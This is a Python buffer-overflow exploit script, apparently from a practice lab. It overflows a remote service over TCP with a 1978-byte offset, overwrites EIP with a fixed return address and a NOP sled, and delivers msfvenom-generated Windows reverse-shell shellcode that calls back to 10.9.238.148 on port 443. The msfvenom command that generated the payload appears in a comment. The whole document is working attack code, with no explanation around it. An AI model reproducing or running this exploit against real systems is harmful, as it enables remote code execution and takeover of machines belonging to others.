#! /usr/bin/env python3 

import socket
import struct

#msfvenom -p windows/shell_reverse_tcp LHOST=10.9.238.148 LPORT=443 EXITFUNC=thread -b "\x00\x07\x08\x2f\x2e\xa0\xa10" -f py -v shellcode

shellcode =  b""
shellcode += b"\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"
shellcode += b"\x5e\x81\x76\x0e\x38\xdf\x8d\xda\x83\xee\xfc"
shellcode += b"\xe2\xf4\xc4\x37\x0f\xda\x38\xdf\xed\x53\xdd"
shellcode += b"\xee\x4d\xbe\xb3\x8f\xbd\x51\x6a\xd3\x06\x88"
shellcode += b"\x2c\x54\xff\xf2\x37\x68\xc7\xfc\x09\x20\x21"
shellcode += b"\xe6\x59\xa3\x8f\xf6\x18\x1e\x42\xd7\x39\x18"
shellcode += b"\x6f\x28\x6a\x88\x06\x88\x28\x54\xc7\xe6\xb3"
shellcode += b"\x93\x9c\xa2\xdb\x97\x8c\x0b\x69\x54\xd4\xfa"
shellcode += b"\x39\x0c\x06\x93\x20\x3c\xb7\x93\xb3\xeb\x06"
shellcode += b"\xdb\xee\xee\x72\x76\xf9\x10\x80\xdb\xff\xe7"
shellcode += b"\x6d\xaf\xce\xdc\xf0\x22\x03\xa2\xa9\xaf\xdc"
shellcode += b"\x87\x06\x82\x1c\xde\x5e\xbc\xb3\xd3\xc6\x51"
shellcode += b"\x60\xc3\x8c\x09\xb3\xdb\x06\xdb\xe8\x56\xc9"
shellcode += b"\xfe\x1c\x84\xd6\xbb\x61\x85\xdc\x25\xd8\x80"
shellcode += b"\xd2\x80\xb3\xcd\x66\x57\x65\xb7\xbe\xe8\x38"
shellcode += b"\xdf\xe5\xad\x4b\xed\xd2\x8e\x50\x93\xfa\xfc"
shellcode += b"\x3f\x20\x58\x62\xa8\xde\x8d\xda\x11\x1b\xd9"
shellcode += b"\x8a\x50\xf6\x0d\xb1\x38\x20\x58\x8a\x68\x8f"
shellcode += b"\xdd\x9a\x68\x9f\xdd\xb2\xd2\xd0\x52\x3a\xc7"
shellcode += b"\x0a\x1a\xb0\x3d\xb7\x87\xd3\xd6\x4b\xe5\xd8"
shellcode += b"\x38\xde\x36\x53\xde\xb5\x9d\x8c\x6f\xb7\x14"
shellcode += b"\x7f\x4c\xbe\x72\x0f\xbd\x1f\xf9\xd6\xc7\x91"
shellcode += b"\x85\xaf\xd4\xb7\x7d\x6f\x9a\x89\x72\x0f\x50"
shellcode += b"\xbc\xe0\xbe\x38\x56\x6e\x8d\x6f\x88\xbc\x2c"
shellcode += b"\x52\xcd\xd4\x8c\xda\x22\xeb\x1d\x7c\xfb\xb1"
shellcode += b"\xdb\x39\x52\xc9\xfe\x28\x19\x8d\x9e\x6c\x8f"
shellcode += b"\xdb\x8c\x6e\x99\xdb\x94\x6e\x89\xde\x8c\x50"
shellcode += b"\xa6\x41\xe5\xbe\x20\x58\x53\xd8\x91\xdb\x9c"
shellcode += b"\xc7\xef\xe5\xd2\xbf\xc2\xed\x25\xed\x64\x6d"
shellcode += b"\xc7\x12\xd5\xe5\x7c\xad\x62\x10\x25\xed\xe3"
shellcode += b"\x8b\xa6\x32\x5f\x76\x3a\x4d\xda\x36\x9d\x2b"
shellcode += b"\xad\xe2\xb0\x38\x8c\x72\x0f"


def p32(data):
    return struct.pack("<I", data)

ip = "<IP>"
port = <PORT>


prefix = b""
length = 5000
offset = 1978
new_eip = p32(0x625011AF)
nop_sled = b"\x90" * 24

payload = prefix + b"A"*offset + new_eip + nop_sled +shellcode + b"C"* (length - len(new_eip) - offset - len(shellcode) - len(nop_sled))

try: 
    with socket.socket() as s:
        s.connect((ip,port))
        s.send(payload)
        print ("[+] " + str(len(payload)-len(prefix)) + " Bytes Sent")
except:
    print ("[-] Crashed")